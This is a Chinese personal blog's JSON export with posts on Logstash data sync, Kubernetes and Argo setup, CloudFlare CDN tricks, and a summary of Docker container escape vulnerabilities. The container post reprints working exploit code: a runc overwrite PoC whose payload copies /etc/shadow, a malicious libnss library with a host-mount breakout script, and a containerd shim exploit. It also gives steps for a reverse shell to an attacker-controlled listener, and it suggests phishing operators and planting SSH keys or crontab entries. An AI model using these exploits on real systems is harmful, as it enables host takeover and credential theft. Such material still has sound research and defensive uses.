{"meta":{"title":"小九博客","subtitle":"","description":"","author":"Joe","url":"https://war9.cn","root":"/"},"pages":[{"title":"关于我","date":"2017-12-28T15:49:51.000Z","updated":"2021-02-18T16:44:58.971Z","comments":true,"path":"about/index.html","permalink":"https://war9.cn/about/index.html","excerpt":"","text":"关于作者 about me 个人信息 中文 English 九叔/男 UncleNine/Male 本科/计算机科学与技术专业 Bachelor degree in computer science and techn 安全研发工程师 Security R &amp; D Engineer 博客：https://war9.cn Blog：https://war9.cn 联系方式 Welcome to contact me. &nbsp;&nbsp;Email: x9sec888@gmail.com / x9_sec@163.com Phone:132*****20 //请通过邮件联系获取 &nbsp;&nbsp;&nbsp;&nbsp;QQ:1649880988 捐助本站如果本站文章对您有所帮助，本站接受以捐助的形式来支持博主。十分感谢！本站默认会以支付名称写到捐助名单，如要修改捐助信息，请联系我！ 捐助排行 姓名 捐赠形式 捐赠时间 捐赠金额 其它 王超 支付宝 2018-1-5 120元 赵建 支付宝 2018-1-9 60元 *丙昆 支付宝 2018-1-5 60元 *志鹏 支付宝 2018-1-5 60元 *港福 支付宝 2018-1-5 60元"}],"posts":[{"title":"MySQL数据同步到ElasticSearch(Logstash方案)爬坑纪实","slug":"MySQL数据同步到ElasticSearch-Logstash方案-爬坑纪实","date":"2021-08-11T05:52:00.000Z","updated":"2021-08-11T08:44:01.138Z","comments":true,"path":"2021/08/11/MySQL数据同步到ElasticSearch-Logstash方案-爬坑纪实/","link":"","permalink":"https://war9.cn/2021/08/11/MySQL%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%88%B0ElasticSearch-Logstash%E6%96%B9%E6%A1%88-%E7%88%AC%E5%9D%91%E7%BA%AA%E5%AE%9E/","excerpt":"","text":"前言做态势感知平台时，遇到了数据量的快速增长，MySQL数据终于达到了百万级别，这个时候对于大量模糊查询的需求MySQL显然不如ElasticSearch更为专业。在先前项目中，ES的部署、数据存储都是由其他同事专门负责，因而对ElasticSearch的使用还处于接口调用级别，今天终于轮到自己尝遍苦涩来爬坑了。 需求分析现有环境： MySQL 8版本 ElasticSearch 7.8 需求为第一次全量更新MySQL数据到ES，后续增量同步数据。 根据需求查阅了相关资料，目前较为使用广泛的方案有两种: 基于MySQL binlog Logstash 其中基于MySQL binlog的常用组件包括： go-mysql-elasticsearch:一个是开源方案，基于GO语言编写的小工具，Github地址:https://github.com/go-mysql-org/go-mysql-elasticsearch 。查看相关文档感觉使用十分简单，但其仅支持MySQL8.0以下版本和ElasticSearch 6.0以下版本。不能说不太时髦，简直是落后时代。 Canal:阿里开源,一款看起来还不错的数据库中间件，支持基于日志增量订阅和消费的业务场景。文档支持MySQL5.1.x , 5.5.x , 5.6.x , 5.7.x , 8.0.x。在经过几天的调研，发现其存在文档过时、各版本之间变化差异大、部署复杂的问题因此放弃。 最终还是选用了业内常用的ELK技术栈，采用Logstash作为数据同步服务。相较于工具级的脚本，他优势在于配置、插件较为丰富，适应不同的数据库以及各类繁杂的版本。和Canal对比的话，莫过于网上的文章普天盖地，文档一直在保持更新～ Logstash采集MySQL数据到ES为了避免各类Java JDK版本带来的坑，采用Docker进行部署。 同时Logstash存在sql_last_value 变量可以用来做增量更新，增量更新支持两种判断，一是数字类型的字段，另一种是Date、Datetime、Timesteamp 日期类型的判断。判断逻辑为 记录最后一次更新值，下次执行时与上一次比较，从而判断是否更新。 本文MySQL数据表中存在created_at字段，类型为timestamp，由于业务形态，数据不需要更新，因此没有使用updated_at更新时间来判断，如果您的业务有更新操作，建议使用更新时间的时间戳。 Logstash部署123docker pull logstash:7.8.0mkdir -p /dockerdocker run -d --name logstash -v /docker/logstash/:/etc/logstash/pipeline/ logstash:7.8.0 此时创建了一个名为logstash的docker镜像。同时挂载容器内/etc/logstash/pipeline到本地logstash目录，后续用于存放需要用到的插件以及配置。 此处需要注意权限问题，Docker容器内logstash启动时使用的是logstash用户，如果不一致可能会没有权限读取该目录下的配置和插件。 Logstash配置 下载MySQL Connector Logstash读取MySQL采用的是JDBC驱动，因此需要下载MySQL对应版本的Connector。下载地址:https://repo1.maven.org/maven2/mysql/mysql-connector-java/ 根据自己MySQL的版本进行选择，我这里选择的是8.0.26.https://repo1.maven.org/maven2/mysql/mysql-connector-java/8.0.26/mysql-connector-java-8.0.26.jar 将connector放到/etc/logstash/pipeline目录. 添加logstash输入输出配置 贴一下我的配置，使用时需要删除注释,不然会报错。 文件位置:/etc/logstash/conf.d/mysql_es.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162input &#123; stdin &#123;&#125; jdbc &#123; # JDBC 连接字符串 jdbc_connection_string &#x3D;&gt; &quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?characterEncoding&#x3D;UTF-8&amp;useSSL&#x3D;false&amp;autoReconnect&#x3D;true&quot; jdbc_user &#x3D;&gt; &quot;username&quot; jdbc_password &#x3D;&gt; &quot;password&quot; # JDBC驱动位置 jdbc_driver_library &#x3D;&gt; &quot;&#x2F;etc&#x2F;logstash&#x2F;pipeline&#x2F;mysql-connector-java-8.0.26.jar&quot; jdbc_driver_class &#x3D;&gt; &quot;com.mysql.jdbc.Driver&quot; # 支持分页执行 jdbc_paging_enabled &#x3D;&gt; &quot;true&quot; # 每页数量 jdbc_page_size &#x3D;&gt; &quot;50000&quot; codec &#x3D;&gt; plain &#123; charset &#x3D;&gt; &quot;UTF-8&quot;&#125; # 是否需要记录某个字段值,如果为true,我们可以自定义要记录的字段值，例如日期字段。如果为false，记录的是上次执行的timestamp. use_column_value &#x3D;&gt; &quot;true&quot; # 需要跟踪的字段，增量更新时,需要借助该字段进行判断。 tracking_column &#x3D;&gt; &quot;created_at&quot; # 跟踪的字段类型 tracking_column_type &#x3D;&gt; &quot;timestamp&quot; # 是否记录最后一次执行 record_last_run &#x3D;&gt; &quot;true&quot; # 最后一次执行 存放的地址，这里首次需要自行创建该文件，由于我使用日期时间进行判断，因此需要写默认值 1970-01-01 00:00:00 last_run_metadata_path &#x3D;&gt; &quot;&#x2F;opt&#x2F;logstash&#x2F;lastrun&#x2F;.logstash_jdbc_last_run&quot; # 设置时区 jdbc_default_timezone &#x3D;&gt; &quot;Asia&#x2F;Shanghai&quot; # 很多教程建议使用statement_filepath，在SQL文件里写判断语句，我在实际使用过程中发现这种方式会在SQL语句后面加入一个\\n换行符。这里我采用statement直接写SQL的方式进行。filepath的方式作为备份。 # statement_filepath &#x3D;&gt; &quot;&#x2F;etc&#x2F;logstash&#x2F;pipeline&#x2F;jdbc.sql&quot; statement &#x3D;&gt; &quot;select * from orders where created_at &gt; :sql_last_value&quot; # 执行的时候是否清空先前的 clean_run &#x3D;&gt; false # 定时执行Cron规则 schedule &#x3D;&gt; &quot;* * * * *&quot; type &#x3D;&gt; &quot;std&quot; &#125; &#125;output &#123; elasticsearch &#123; hosts &#x3D;&gt; &quot;127.0.0.1:9200&quot; # ElasticSearch 索引 index &#x3D;&gt; &quot;test&quot; # 文档类型 需要注意的是ES7.0 之前，一个 Index 可以创建多个 Document Type，但在 7.0 开始及之后，一个Index 只能对应一个 Document Type，且默认是 _doc 。同时后续不建议继续使用。 document_type &#x3D;&gt; &quot;order&quot; # 对应数据库表中的ID document_id &#x3D;&gt; &quot;%&#123;id&#125;&quot; &#125; stdout &#123; codec &#x3D;&gt; json_lines &#125;&#125; 在这个过程中也遇到了一个坑，最初的配置由网上的文章复制而来，其 把sql_last_value写成了last_sql_value。。导致一直提示SQL语法错误。这里分享一个调试命令，我通过此方法成功发现了该问题。 bin/logstash -f /etc/logstash/conf.d/mysql_es.conf --verbose --debug 修改执行配置 进入容器的logstash安装目录，修改配置vi config/pipelines.yml内容如下,使其支持多个配置的执行 12- pipeline.id: main path.config: &quot;/etc/logstash/conf.d/*.conf&quot; 一般情况，这里就配置完毕了，但是在某些Logstash官方提供的Docker镜像中，默认开启了x-pack组件，如果ES没有用到该组件需要修改如下配置vi config/logstash.yaml，将Xpack相关的配置都注释掉: 123# 注释~# xpack.monitoring.elasticsearch.hosts: [ &quot;http:&#x2F;&#x2F;127.0.0.1:9200&quot; ] 启动Logstash，开始同步数据 查看数据是否同步成功 12345# 查看索引结构# curl localhost:9200/索引名称?prettycurl localhost:9200/test?pretty# 查看所有索引信息curl -XGET http://localhost:9200/_cat/indices?v 一些其他的坑和知识 logstash默认的日志位置:/var/log/logstash,错误日志logstash-plain.log,stdout输出logstash.stdout logstash与ElasticSearch的版本尽量保持一致，避免奇怪的问题。 在 7.0 以及之后的版本中ES的 Document_Type 被废弃了。一个 index 中只有一个默认的 type，即 _doc。 自Elastic 7.11 版本开始，Elasticsearch 与 Kibana 代码所遵循的 Apache 2.0 许可会调整为 SSPL 与 Elastic License 双许可。 ref: https://www.elastic.co/guide/en/logstash/7.8/index.html logstash官方文档 https://zhuanlan.zhihu.com/p/266350196 ES扫盲","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"ElasticSearch","slug":"ElasticSearch","permalink":"https://war9.cn/tags/ElasticSearch/"},{"name":"MySQL同步","slug":"MySQL同步","permalink":"https://war9.cn/tags/MySQL%E5%90%8C%E6%AD%A5/"},{"name":"Logstash","slug":"Logstash","permalink":"https://war9.cn/tags/Logstash/"}],"author":"Joe"},{"title":"自动化编排学习（一）部署篇","slug":"自动化编排学习部署篇","date":"2021-06-07T02:12:00.000Z","updated":"2021-07-28T06:06:17.369Z","comments":true,"path":"2021/06/07/自动化编排学习部署篇/","link":"","permalink":"https://war9.cn/2021/06/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E7%BC%96%E6%8E%92%E5%AD%A6%E4%B9%A0%E9%83%A8%E7%BD%B2%E7%AF%87/","excerpt":"","text":"安装K8s安装K8s客户端，此处为下载最新版本。更多安装信息可查看官网文档 123curl -LO &quot;https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;chmod +x kubectlsudo install kubectl /usr/local/bin/ 安装服务端，官方提供了三个工具，Kind、Minikube、Kubeadm 学习时可使用Minikube，安装较为方便。 这里有一个坑，使用阿里云国内镜像源启动k8s服务时，阿里云国内的镜像源可能没有同步至最新版本，导致版本不匹配，所以选择版本时请随时查看阿里云支持的版本。 123456789101112131415#下载Minikubecurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64sudo install minikube-linux-amd64 /usr/local/bin/minikube#启动时不能使用ROOT权限，需要创建非ROOT用户进行。useradd minikube# 给创建的minikube用户增加docker权限sudo usermod -aG docker minikube &amp;&amp; newgrp dockersu minikube#以Docker驱动启动 并且设置阿里云镜像源minikube start --driver=docker --image-mirror-country=&#x27;cn&#x27; --image-repository=&#x27;registry.cn-hangzhou.aliyuncs.com/google_containers&#x27;#如果使用私有Docker仓库，未开启HTTPS 需要添加以下参数#--insecure-registry=&quot;192.168.1.1:5000&quot; Argo-framework部署 https://github.com/argoproj/argo-workflows/releases 部署Argo 服务12345678910111213141516#创建命名空间kubectl create ns argo#通过Yaml启动服务kubectl apply -n argo -f https://raw.githubusercontent.com/argoproj/argo-workflows/stable/manifests/quick-start-postgres.yaml#查看PODS信息kubectl get pods -n argo#查看服务器IP信息kubectl -n argo get svc#将web服务映射到127.0.0.1:2746kubectl -n argo port-forward deployment/argo-server 2746:2746#Nginx反向代理出2746端口 部署ArgoEventArgoEvent需要单独部署，默认是没有的 1234#创建命名空间kubectl create namespace argo-eventswget https://raw.githubusercontent.com/argoproj/argo-events/stable/manifests/install.yamlkubectl apply -n argo -f install.yaml Argo基础 此处的概念理解，为本人初次学习的理解，不保证完全正确，欢迎勘误。 概念： Argo EventSource: 用于定义事件属性，触发的条件。支持File、Redis、Webhook、Github、Kafka等20多种事件源。使用时可通过定义传感器(Sensor)来设置事件依赖(depencies)以及设置触发器触发相应的操作。 Argo Yaml语法EventSource示例1234567891011121314151617181920212223apiVersion: argoproj.io/v1alpha1kind: EventSourcemetadata: namespace: argo name: filespec: template: container: volumeMounts: - mountPath: /test-data name: test-data volumes: - name: test-data emptyDir: &#123;&#125; file: example: watchPathConfig: # directory to watch directory: /test-data/ # path to watch # type of the event # supported types are: CREATE, WRITE, REMOVE, RENAME, CHMOD eventType: WRITE Workflow-step示例1234567891011121314151617181920212223242526272829303132333435363738templates:- name: hello # Instead of just running a container # This template has a sequence of steps steps: - - name: hello1 # hello1 is run before the following steps template: whalesay arguments: parameters: - name: message value: &quot;hello1&quot; - - name: hello2a # double dash =&gt; run after previous step template: whalesay arguments: parameters: - name: message value: &quot;hello2a&quot; - name: hello2b # single dash =&gt; run in parallel with previous step template: whalesay arguments: parameters: - name: message value: &quot;hello2b&quot; - - name: hello3 # double dash =&gt; run after previous step template: whalesay arguments: parameters: - name: message value: &quot;hello3&quot; # This is the same template as from the previous example - name: whalesay inputs: parameters: - name: message container: image: docker/whalesay command: [cowsay] args: [&quot;&#123;&#123;inputs.parameters.message&#125;&#125;&quot;] 其中- -表示与前面的任务串行，前面的任务完成后才能继续。-表示可以并行执行 Workflow-IF示例123456789101112131415161718192021222324252627282930templates:- name: coinflip steps: - - name: flip-coin template: flip-coin - - name: heads template: heads when: &quot;&#123;&#123;steps.flip-coin.outputs.result&#125;&#125; == 1&quot; - name: tails template: tails when: &quot;&#123;&#123;steps.flip-coin.outputs.result&#125;&#125; == 0&quot;- name: flip-coin script: image: python:alpine3.6 command: [python] source: | import random print(random.randint(0,1))- name: heads container: image: alpine:3.6 command: [sh, -c] args: [&quot;echo \\&quot;it was heads\\&quot;&quot;]- name: tails container: image: alpine:3.6 command: [sh, -c] args: [&quot;echo \\&quot;it was tails\\&quot;&quot;] Workflow-Input-Output示例12345678910111213141516171819202122232425262728293031templates:- name: output-parameter steps: - - name: generate-parameter template: whalesay - - name: consume-parameter template: print-message arguments: parameters: - name: message value: &quot;&#123;&#123;steps.generate-parameter.outputs.parameters.hello-param&#125;&#125;&quot;- name: whalesay container: image: docker/whalesay:latest command: [sh, -c] args: [&quot;echo -n hello world &gt; /tmp/hello_world.txt&quot;] outputs: parameters: - name: hello-param valueFrom: path: /tmp/hello_world.txt- name: print-message inputs: parameters: - name: message container: image: docker/whalesay:latest command: [cowsay] args: [&quot;&#123;&#123;inputs.parameters.message&#125;&#125;&quot;] Workflow-Loop示例12345678910111213141516171819202122232425262728293031323334353637383940414243apiVersion: argoproj.io/v1alpha1kind: Workflowmetadata: generateName: loops-param-arg-spec: entrypoint: loop-param-arg-example arguments: parameters: - name: os-list # a list of items value: | [ &#123; &quot;image&quot;: &quot;debian&quot;, &quot;tag&quot;: &quot;9.1&quot; &#125;, &#123; &quot;image&quot;: &quot;debian&quot;, &quot;tag&quot;: &quot;8.9&quot; &#125;, &#123; &quot;image&quot;: &quot;alpine&quot;, &quot;tag&quot;: &quot;3.6&quot; &#125;, &#123; &quot;image&quot;: &quot;ubuntu&quot;, &quot;tag&quot;: &quot;17.10&quot; &#125; ] templates: - name: loop-param-arg-example inputs: parameters: - name: os-list steps: - - name: test-linux template: cat-os-release arguments: parameters: - name: image value: &quot;&#123;&#123;item.image&#125;&#125;&quot; - name: tag value: &quot;&#123;&#123;item.tag&#125;&#125;&quot; withParam: &quot;&#123;&#123;inputs.parameters.os-list&#125;&#125;&quot; # parameter specifies the list to iterate over # This template is the same as in the previous example - name: cat-os-release inputs: parameters: - name: image - name: tag container: image: &quot;&#123;&#123;inputs.parameters.image&#125;&#125;:&#123;&#123;inputs.parameters.tag&#125;&#125;&quot; command: [cat] args: [/etc/os-release] Workflow-Script示例12345678name: gen-number-listscript: image: python:alpine3.6 command: [python] source: | import json import sys json.dump([i for i in range(20, 31)], sys.stdout) 文中部分例子来自，https://zhuanlan.zhihu.com/p/181692322 、https://blog.csdn.net/qq_39316848/article/details/107688739 使用私有仓库创建私有仓库12345678docker pull registrydocker run -d -p 5000:5000 --restart always --name registry registry:2 -v [本地路径]:/var/lib/registry#向私有仓库推送镜像docker pull docker.io/lemonbar/centos6-ssh docker tag efd998bd6817 centos6-ssh #改名字docker rmi docker.io/lemonbar/centos6-ssh docker tag centos-ssh 192.168.0.112:5000/centos6-sshdocker push 192.168.0.112:5000/centos6-ssh Minikube从私有仓库拉取1234#如果已经安装minikube，则先删除minikube delete#设置内部仓库地址minikube start --driver=docker --image-mirror-country=&#x27;cn&#x27; --image-repository=&#x27;registry.cn-hangzhou.aliyuncs.com/google_containers&#x27; --insecure-registry=192.168.0.112:5000 K8s拉去镜像时标记为私有镜像源 12345678910111213apiVersion: v1kind: Podmetadata:name: kubia-manualspec:containers:- image: 192.168.0.112:5000/kubia #tag=registry_ip:5000/kubianame: kubiaports:- containerPort: 8080protocol: TCP","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://war9.cn/tags/k8s/"},{"name":"workflow","slug":"workflow","permalink":"https://war9.cn/tags/workflow/"},{"name":"argo-framework","slug":"argo-framework","permalink":"https://war9.cn/tags/argo-framework/"},{"name":"k8s部署","slug":"k8s部署","permalink":"https://war9.cn/tags/k8s%E9%83%A8%E7%BD%B2/"}],"author":"Joe"},{"title":"常见容器漏洞总结","slug":"常见容器漏洞总结","date":"2021-05-07T10:00:00.000Z","updated":"2021-05-07T10:20:25.998Z","comments":true,"path":"2021/05/07/常见容器漏洞总结/","link":"","permalink":"https://war9.cn/2021/05/07/%E5%B8%B8%E8%A7%81%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"本文在对常见容器漏洞进行了总结，在总结过程中发现了大量优秀的文章及利用工具集。未完待续.. https://security.tencent.com/index.php/blog/msg/183《红蓝对抗中的云原生漏洞挖掘及利用实录》 https://github.com/cdk-team/CDK 容器环境利用工具集 Docker-RunC漏洞致容器逃逸(CVE-2019-5736)利用条件 Docker Version &lt; 18.09.2 RunC Version &lt;1.0-rc6 攻击者具有容器文件上传权限 &amp; 管理员使用exec访问容器 || 攻击者具有启动容器权限 漏洞原理攻击者可以将容器中的目标文件替换成指向runC的自己的文件来欺骗runC执行自己。比如目标文件是/bin/bash，将它替换成指定解释器路径为#!/proc/self/exe的可执行脚本，在容器中执行/bin/bash时将执行/proc/self/exe，它指向host上的runC文件。然后攻击者可以继续写入/proc/self/exe试图覆盖host上的runC文件。但是一般来说不会成功，因为内核不允许在执行runC时覆盖它。为了解决这个问题，攻击者可以使用O_PATH标志打开/proc/self/exe的文件描述符，然后通过/proc/self/fd/&lt;nr&gt;使用O_WRONLY标志重新打开文件，并尝试在一个循环中从一个单独的进程写入该文件。当runC退出时覆盖会成功，在此之后，runC可以用来攻击其它容器或host。 漏洞POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package main// Implementation of CVE-2019-5736// Created with help from @singe, @_cablethief, and @feexd.// This commit also helped a ton to understand the vuln// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9dimport ( &quot;fmt&quot; &quot;io/ioutil&quot; &quot;os&quot; &quot;strconv&quot; &quot;strings&quot;)// This is the line of shell commands that will execute on the hostvar payload = &quot;#!/bin/bash \\n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;func main() &#123; // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(&quot;/bin/sh&quot;) if err != nil &#123; fmt.Println(err) return &#125; fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;) err = fd.Close() if err != nil &#123; fmt.Println(err) return &#125; fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;) // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 &#123; pids, err := ioutil.ReadDir(&quot;/proc&quot;) if err != nil &#123; fmt.Println(err) return &#125; for _, f := range pids &#123; fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;) fstring := string(fbytes) if strings.Contains(fstring, &quot;runc&quot;) &#123; fmt.Println(&quot;[+] Found the PID:&quot;, f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil &#123; fmt.Println(err) return &#125; &#125; &#125; &#125; // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 &#123; // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777) if int(handle.Fd()) &gt; 0 &#123; handleFd = int(handle.Fd()) &#125; &#125; fmt.Println(&quot;[+] Successfully got the file handle&quot;) // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it&#x27;s executable flag for &#123; writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) &gt; 0 &#123; fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle) writeHandle.Write([]byte(payload)) return &#125; &#125;&#125; 漏洞利用1234#攻击者在容器内执行CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go #编译POCchmod 777 main./main #执行Payload 后续可结合钓鱼邮件等手法，等待运维人员去通过exec访问容器的/bin/bash。使用如下命令： 1sudo docker exec -it cafa20cfb0f9 /bin/sh ref: https://github.com/Frichetten/CVE-2019-5736-PoC https://www.anquanke.com/post/id/170762 Docker-cp漏洞致容器逃逸(CVE-CVE-2019-14271)利用条件 Docker Version == 19.03 &amp;&amp; &lt;19.03.1 漏洞原理Docker采用Golang编写，更具体一些，存在漏洞的Docker版本采用Go v1.11编译。在这个版本中，包含嵌入式C代码（cgo）的某些package会在运行时动态加载共享库。这些package包括net及os/user，docker-tar都用到了这两个package，会在运行时动态加载一些libnss_*.so库。正常情况下，程序库会从宿主机的文件系统中加载，然而由于docker-tar会chroot到容器中，因此会从容器的文件系统中加载这些库。这意味着docker-tar会加载并执行受容器控制的代码。 漏洞POC恶意so：libnss_files.so by C 123456789101112131415161718192021222324252627282930313233343536373839#include ...#define ORIGINAL_LIBNSS &quot;/original_libnss_files.so.2&quot;#define LIBNSS_PATH &quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;bool is_priviliged();__attribute__ ((constructor)) void run_at_link(void)&#123; char * argv_break[2]; if (!is_priviliged()) return; rename(ORIGINAL_LIBNSS, LIBNSS_PATH); fprintf(log_fp, &quot;switched back to the original libnss_file.so&quot;); if (!fork()) &#123; // Child runs breakout argv_break[0] = strdup(&quot;/breakout&quot;); argv_break[1] = NULL; execve(&quot;/breakout&quot;, argv_break, NULL); &#125; else wait(NULL); // Wait for child return;&#125;bool is_priviliged()&#123; FILE * proc_file = fopen(&quot;/proc/self/exe&quot;, &quot;r&quot;); if (proc_file != NULL) &#123; fclose(proc_file); return false; // can open so /proc exists, not privileged &#125; return true; // we&#x27;re running in the context of docker-tar&#125; breakout脚本 12345678910#!&#x2F;bin&#x2F;bashumount &#x2F;host_fs &amp;&amp; rm -rf &#x2F;host_fsmkdir &#x2F;host_fsmount -t proc none &#x2F;proc # mount the host&#39;s procfs over &#x2F;proccd &#x2F;proc&#x2F;1&#x2F;root # chdir to host&#39;s rootmount --bind . &#x2F;host_fs # mount host root at &#x2F;host_fsecho &quot;Hello from within the container!&quot; &gt; &#x2F;host_fs&#x2F;evil 漏洞利用 待完善，暂未复现，大致思路如下 1.编译libnss_files.c为libnss_files.so 2.修改breakout脚本，例如写ssh key 等 3.等待或通过钓鱼邮件等手段，使得运维人员执行docker cp ref: https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/ Docker-Containerd漏洞致容器逃逸(CVE-2020-15257)利用条件 containerd &lt; 1.4.3 containerd &lt; 1.3.9 使用hostnetwork网络模式启动容器 &amp;&amp; 使用root用户(UID:0)启动容器 漏洞原理使用hostnetwork网络模式中，容器和主机共享网络命名空间，因此在容器内可以访问host特定的socket文件(shim.sock)。可通过启动一个新的容器，该容器挂在host目录到容器的/host目录，即可实现对host完全的读写。 漏洞POC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport ( &quot;context&quot; &quot;errors&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net&quot; &quot;regexp&quot; &quot;strings&quot; &quot;github.com/containerd/ttrpc&quot; &quot;github.com/gogo/protobuf/types&quot;)func exp(sock string) bool &#123; sock = strings.Replace(sock, &quot;@&quot;, &quot;&quot;, -1) conn, err := net.Dial(&quot;unix&quot;, &quot;\\x00&quot;+sock) if err != nil &#123; log.Println(err) return false &#125; client := ttrpc.NewClient(conn) shimClient := NewShimClient(client) ctx := context.Background() info, err := shimClient.ShimInfo(ctx, &amp;types.Empty&#123;&#125;) if err != nil &#123; log.Println(&quot;rpc error:&quot;, err) return false &#125; log.Println(&quot;shim pid:&quot;, info.ShimPid) return true&#125;func getShimSockets() ([][]byte, error) &#123; re, err := regexp.Compile(&quot;@/containerd-shim/.*\\\\.sock&quot;) if err != nil &#123; return nil, err &#125; data, err := ioutil.ReadFile(&quot;/proc/net/unix&quot;) matches := re.FindAll(data, -1) if matches == nil &#123; return nil, errors.New(&quot;Cannot find vulnerable socket&quot;) &#125; return matches, nil&#125;func main() &#123; matchset := make(map[string]bool) socks, err := getShimSockets() if err != nil &#123; log.Fatalln(err) &#125; for _, b := range socks &#123; sockname := string(b) if _, ok := matchset[sockname]; ok &#123; continue &#125; log.Println(&quot;try socket:&quot;, sockname) matchset[sockname] = true if exp(sockname) &#123; break &#125; &#125; return&#125; 漏洞利用1.下载容器渗透工具包 https://github.com/cdk-team/CDK/releases/tag/v1.0.1 2.在服务器NC监听端口 3. 12chmod +x cdk_linux_amd64./cdk_linux_amd64 run shim-pwn &lt;自己服务器IP&gt; &lt;NC端口&gt; ref: https://www.cdxy.me/?p=837 https://zhuanlan.zhihu.com/p/332334413 Docker-Swarm未授权访问致命令执行利用条件 使用Docker Swarm并且未对2375端口访问加任何限制访问措施 漏洞原理在使用Docker Swarm的时候，管理的Docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，其实这是 Docker Remote API，可以执行Docker命令，比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在Docker CLI上执行Docker ps的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。 漏洞POC1docker -H tcp://x.x.x.x:2375 ps 漏洞利用可通过挂载host目录，之后使用crontab或者写ssh key来利用。","categories":[{"name":"信息安全","slug":"security","permalink":"https://war9.cn/categories/security/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://war9.cn/tags/Docker/"},{"name":"容器漏洞","slug":"容器漏洞","permalink":"https://war9.cn/tags/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E/"},{"name":"容器逃逸","slug":"容器逃逸","permalink":"https://war9.cn/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"},{"name":"Docker漏洞","slug":"Docker漏洞","permalink":"https://war9.cn/tags/Docker%E6%BC%8F%E6%B4%9E/"}],"author":"Joe"},{"title":"免费CDN加速手把手教程","slug":"免费CDN加速手把手教程","date":"2021-03-06T02:54:00.000Z","updated":"2021-03-06T12:20:17.999Z","comments":true,"path":"2021/03/06/免费CDN加速手把手教程/","link":"","permalink":"https://war9.cn/2021/03/06/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E7%A8%8B/","excerpt":"","text":"作为一个普通的IT Guy，我不禁时常怀疑，为何别人的飞机场要比自己搭建的小飞机速度快那么多呢？难道飞机场主都是究极土豪，人均CN2 GIA线路？直到我在90Sec看到一篇内务帖… 现有90论坛处于CloudFlare CDN默认加速防护下，众所周知的原因，CloudFlareCDN对于国内用户，很多时候不仅不会加速，还会增加延迟。 @c0bra大佬提出：在接入CDN后，可以接入CloudFlare Partner平台，再通过智能DNS解析，设置CloudFlare自选IP，以达到加速目的。 这是我第一次接入到CloudFlare自选IP这个概念，看完大佬说的步骤也甚是迷惑，在经过各种Google和Baidu，终于产生了该文章。 1.为何国内用户直接使用CloudFlare（CF）CDN加速效果不理想？CDN优点非常多，包括加速网站访问，减轻源站压力，隐藏真实IP等。CloudFlare因其优质免费的服务，吸引了大量国内用户，几年前我第一次知道该平台时，兴冲冲的将博客域名托管到了CloudFlare下，然而仅仅过了半年，网站就时常无法访问，我使用真实IP直接访问也比走CDN速度快，我便对该服务的好坏产生了怀疑，我们来看看CloudFlareCDN是如何实现加速的。 CloudFlare官网默认不提供CNAME和A记录接入CDN的方式，而免费的套餐CDN节点很有限，有限的节点中很多对于国内用户也不是很友好，随机分配节点因此也成了网站间歇性故障的主要原因。 2.CloudFlare CDN自选IP是如何实现加速的？既然随机分配的节点无法保证可用率，那么我们是否可以自己选择速度快的节点进行接入呢？ 免费套餐下，在官网是无法实现该功能了，但是我们可以利用智能DNS+CloudFlare Partner平台来实现通过CNAME和A记录接入CloudFlare，以实现自选IP的目的。 3.学会自选IP加速我们能做什么？ 小飞机加速 网站提速 真实IP被Q使用CDN访问 ..各种需要CDN的场景 3.1 小飞机加速手把手教程3.1.1 寻找CDN高速IP节点 首先，我们需要知道如何找高速节点，这里我们推荐一款找高速IP的利器，CloudFlareScanner，我个人的做法是在家里和公司分别运行该扫描，找到不同网络运营商下载速度较快的IP，该方法比较笨，但是十分有效。 聪明些的方法是什么呢？我这里想到可以在家里NAS上设置定时任务，定期扫描高速IP节点，通过Dnspod的接口自动设置高速IP。 